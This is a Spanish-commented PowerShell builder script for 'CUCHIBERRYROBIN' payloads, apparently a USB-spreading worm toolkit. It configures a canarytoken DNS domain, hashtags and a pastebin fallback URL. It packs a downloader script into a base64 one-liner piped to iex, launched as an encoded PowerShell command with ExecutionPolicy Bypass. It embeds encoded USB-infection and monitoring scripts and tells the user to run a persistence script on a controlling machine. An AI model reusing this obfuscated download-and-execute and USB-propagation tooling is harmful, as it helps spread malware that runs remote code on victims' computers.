$mensaje = "Vamos a preparar cargas de CUCHIBERRYROBIN!" # mensaje a mostrar

$longitudMensaje = $mensaje.Length + 2 # longitud del mensaje más dos espacios para los bordes
$bordes = "-" * $longitudMensaje # línea de bordes
$espacios = " " * $longitudMensaje # línea de espacios

$mensajeArt = @"
 $bordes
< $mensaje >
 $bordes
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
$espacios
"@




Write-Host $mensajeArt
Write-Host "Te voy a hacer unas preguntas"
$Conf_CharSet = Read-Host "Que nombre quieres poner a tu distribución?"
$Conf_dnsToken = Read-Host "Pon el dominio base de tu canarytoken.org? ( al estilo pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com)"
$Conf_Hashtag_init = Read-Host "Con que hashtag quieres que inicie? (#CUCHIBERRYROBIN)"
$Conf_Hashtag_end = Read-Host "Con que hashtag quieres que acabe? (#FIN)"
$Conf_pastebin_backup = Read-Host "URL de pastebin donde quieres que descargue si no encuentra el hashtag (https://pastebin.com/ABiV0rH7)"
$Conf_Ballon= ""
$Conf_Ballon= ""
# Preguntar al usuario si la variable es verdadera o falsa
$Conf_Ballon_in = Read-Host "Quieres que muestre mensajes en el escritorio cuando se procesa un USB? (True ó False)"

try
{
    $Conf_Ballon = [System.Convert]::ToBoolean($Conf_Ballon_in)
}catch
{
    Write-Host "Wrong input. Try again."
    $Conf_Ballon = Read-Host -Prompt "Question again"
    $Conf_Ballon = [System.Convert]::ToBoolean($Conf_Ballon)
}

# Copiar la carpeta original a la carpeta temporal
Copy-Item "./src/*" -Destination "./tmp/"  -Force -Recurse



#extracion de todos los ficheros:
# Obtener todas las rutas de archivo en la subcarpeta actual y sus subcarpetas
$archivos = Get-ChildItem -Path ".\tmp\" -Recurse | Where-Object { $_.Extension -eq ".ps1" }

foreach ($archivo in $archivos) {
    $contenido = Get-Content $archivo.FullName
    for ($i = 0; $i -lt $contenido.Count; $i++) {
        
        if ($contenido[$i] -match '^\$Conf_CharSet=') {
            $contenido[$i] = "`$Conf_CharSet=`"$Conf_CharSet`""
        }
        if ($contenido[$i] -match '^\$Conf_dnsToken=') {
            $contenido[$i] = "`$Conf_dnsToken=`"$Conf_dnsToken`""
        }
        if ($contenido[$i] -match '^\$Conf_Hashtag_init=') {
            $contenido[$i] = "`$Conf_Hashtag_init=`"$Conf_Hashtag_init`""
        }
        if ($contenido[$i] -match '^\$Conf_Hashtag_end=') {
            $contenido[$i] = "`$Conf_Hashtag_end=`"$Conf_Hashtag_end`""
        }
        if ($contenido[$i] -match '^\$Conf_pastebin_backup=') {
            $contenido[$i] = "`$Conf_pastebin_backup=`"$Conf_pastebin_backup`""
        }
        
        if ($contenido[$i] -match '^\$Conf_Ballon=') {
            $contenido[$i] = "`$Conf_Ballon=`"$Conf_Ballon`""
        }
    }
    Set-Content $archivo.FullName $contenido
}


#Ahora a sustituir los otros ficheros
#$Downloader_base64 =  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/Downloader.ps1" )))

$s = Get-Content .\src\Downloader.ps1 | Out-String
$j = [PSCustomObject]@{
  "Script" =  [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($s))
} | ConvertTo-Json -Compress

$oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('" + $j + "' | ConvertFrom-Json).Script)) | iex"

$c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))

$Downloader_base64= ("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded " + $c) 





foreach ($archivo in $archivos) {
    $contenido = Get-Content $archivo.FullName
    #Write-Host "Procesando $archivo"
    for ($i = 0; $i -lt $contenido.Count; $i++) {
        
        if ($contenido[$i] -match '^\$downloader=') {
            $contenido[$i] = "`$downloader=`"$Downloader_base64`""
           #Write-Host "Encontrado Downloader en $archivo.FullName"
           # $contenido[$i]
        }
        
        
    }
    Set-Content $archivo.FullName $contenido
    
}






$usbin_base64 =  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/USBin.ps1") -join "`r`n"))
$monitor_base64 =  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/MonitorUSB.ps1") -join "`r`n"))


#$monitor_base64 =  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/MonitorUSB.ps1" )))




#$Downloader_base64 = ConvertTo-EncodedCommand ("./tmp/Downloader.ps1" )

#$usbin_base64 = ConvertTo-EncodedCommand ("./tmp/USBin.ps1" )

#$monitor_base64 =  ConvertTo-EncodedCommand ("./tmp/MonitorUSB.ps1" )






foreach ($archivo in $archivos) {
    $contenido = Get-Content $archivo.FullName
    #Write-Host "Procesando $archivo"
    for ($i = 0; $i -lt $contenido.Count; $i++) {
        
        if ($contenido[$i] -match '^\$file1=') {
            $contenido[$i] = "`$file1=`"$usbin_base64`""
        }
        if ($contenido[$i] -match '^\$file2=') {
            $contenido[$i] = "`$file2=`"$monitor_base64`""
        }
        
        
    }
    Set-Content $archivo.FullName $contenido
    
}




Write-Host "Entra en tmp y ejecuta el powershell de Persiter en la maquina que quieras hacer de reina madre de CUCHIROBIN"
